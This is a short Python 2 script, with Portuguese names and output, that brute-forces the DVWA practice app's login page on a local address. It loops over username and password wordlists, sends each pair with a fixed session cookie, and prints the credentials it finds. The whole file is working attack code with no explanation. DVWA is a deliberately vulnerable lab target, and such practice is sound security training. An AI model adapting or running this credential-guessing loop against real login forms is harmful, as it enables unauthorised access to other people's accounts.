#!/bin/python
import urllib2

fuser = open('user.txt')
usuarios = fuser.read().split('\n')

fpass = open('pass.txt')
senhas = fpass.read().split('\n')

for usuario in usuarios:
    for senha in senhas:
        url = "http://192.168.15.39/dvwa/vulnerabilities/brute/?username=%s&password=%s&Login=Login"%(usuario,senha)
        request = urllib2.Request(url)
        request.add_header('Cookie','security=low; PHPSESSID=24765ee114427f6802f91a7aa11393c3')
        response = urllib2.urlopen(request)
        result = response.read()
        if "Username and/or password incorrect." not in result:
            print "[+] Senha encontrada: ===>  %s:%s"%(usuario,senha)
            break
